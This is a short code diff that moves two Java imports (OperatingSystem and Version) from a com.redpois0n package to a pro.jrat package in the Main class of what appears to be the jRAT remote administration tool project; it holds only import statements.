@@ -9,6 +9,8 @@ import javax.swing.JOptionPane;
 import javax.swing.UIManager;
 
 import pro.jrat.api.events.OnDisableEvent;
+import pro.jrat.common.OperatingSystem;
+import pro.jrat.common.Version;
 import pro.jrat.extensions.Plugin;
 import pro.jrat.extensions.PluginLoader;
 import pro.jrat.io.Files;
@@ -22,8 +24,6 @@ import pro.jrat.ui.frames.FrameAd;
 import pro.jrat.ui.frames.FrameEULA;
 import pro.jrat.utils.TrayIconUtils;
 
-import com.redpois0n.common.OperatingSystem;
-import com.redpois0n.common.Version;
 
 public class Main {
 
